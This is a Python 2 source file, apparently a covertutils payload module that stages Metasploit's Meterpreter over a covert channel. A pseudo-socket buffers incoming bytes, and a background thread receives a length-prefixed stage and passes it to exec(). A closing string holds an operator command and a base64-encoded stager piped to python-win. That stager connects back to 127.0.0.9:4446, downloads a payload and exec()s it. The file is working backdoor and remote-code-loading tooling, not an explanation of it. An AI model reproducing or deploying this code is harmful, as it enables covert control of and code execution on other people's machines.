def init( storage ) :
	print "Initiating Meterpreter Module"
	from Queue import Queue
	from threading import Thread
	import socket,struct,time

	# storage['meterpreter_ins'] = bytearray()
	storage['meterpreter_ins'] = ""
	storage['meterpreter_outs'] = Queue()

	class PseudoSocket (object):
		# pass
		# socket

		def __init__(self, queue = Queue(), buffer_ = bytearray()) :
			self.buffer = buffer_
			self.queue = queue

		def send( self, pkt ) :
			print "PseudoSocket send(): '%s'" % pkt.encode('hex')
			storage['meterpreter_outs'].put(pkt)
			storage['COMMON']['handler'].preferred_send(pkt, 'meterpreter')

		def recv ( self, buf_size ) :
			print "PseudoSocket recv() - {"
			available_bytes = -1
			prev = available_bytes
			while available_bytes < buf_size :
				available_bytes = len(storage['meterpreter_ins'])
				if prev != available_bytes :
					print available_bytes, '/', buf_size
					prev == available_bytes
				# print storage['meterpreter_ins'].encode('hex')
				time.sleep(0.2)
			l = len(storage['meterpreter_ins'])
			ret = storage['meterpreter_ins'][:buf_size]
			# b1 = storage['meterpreter_ins'][0]
			storage['meterpreter_ins'] = storage['meterpreter_ins'][buf_size:]
			# b2 = storage['meterpreter_ins'][0]
			assert( len(ret) == buf_size )
			# assert( b1 != b2 )
			# time.sleep(0.1)
			print "[+] recv: " + ret.encode('hex')
			print "PseudoSocket recv(%d) from %d bytes }" % (buf_size, l)
			print "Remaining '%d' bytes in recv buffer" % len(storage['meterpreter_ins'])
			# print
			assert ( l >= buf_size )
			return ret

		def close( self ) :
			del self.buffer
			del self.queue

		# def connect( self ) : return True
		# def getsockname( self ) :	return ("covertutils_transport", 4444)
		# def getpeername( self ) :	return ("covertutils_server", 4444)
		def getsockname( self ) :	return ("::", 4444)
		def getpeername( self ) :	return ("::", 4444)
		# def settimeout( self, timeout ) : return True

		def empty( self ) : return len(storage['meterpreter_ins']) == 0


	def meterpreter_stage( ) :

		print "Creating PseudoSocket"
		s = PseudoSocket( queue = storage['meterpreter_outs'], buffer_ = storage['meterpreter_ins'] )
		storage['socket'] = s
		print "Getting 4 bytes"
		l=struct.unpack('<I',s.recv(4))[0]
		print "Getting the rest %d bytes of Meterpreter" % l
		d=s.recv(l)
		while len(d)<l:
			print "%d bytes to go!" % l
			d+=s.recv(l-len(d))
		print "Executing Meterpreter main"

		meterpreter_main = d
		# assert '\x00' not in meterpreter_main
		# print "Null byte at: %d" % meterpreter_main.index('\x00')
		print meterpreter_main[-30:]
		print "[!] Goind to exec()!"
		exec(meterpreter_main,{'s':s})
		print "[+] Meterpreter Started!"

	storage['meterpreter_thread'] = Thread( target = meterpreter_stage, args = () )
	storage['meterpreter_thread'].daemon = True
	print "Executing Meterpreter Thread"
	storage['meterpreter_thread'].start()

	return True


def work( storage, message ) :
	# print "[!] Meterpreter Handler Message Arrived!"
	# print message.encode('hex')
	# print message.encode('hex')
	# print "Outs: ",
	# print storage['meterpreter_outs']
	storage['meterpreter_ins'] = storage['meterpreter_ins'] + message
	# print storage['meterpreter_ins'][-30:]
	# print "Message buffer: " + storage['meterpreter_ins']
	# try :
	# 	ret = storage['meterpreter_outs'].get(False)
	# 	print "Returning Meterpreter Response!"
	# 	# return ret
	# except :
	# 	# print "Returned EMPTY message"
	# 	return ''
	return ''
'''

!stage mload covertutils.payloads.generic.meterpreter; !python print "A"

echo 'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuOScsNDQ0NikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=' | python-win
'''
from covertutils.shells.subshells import MeterpreterSubShell as shell
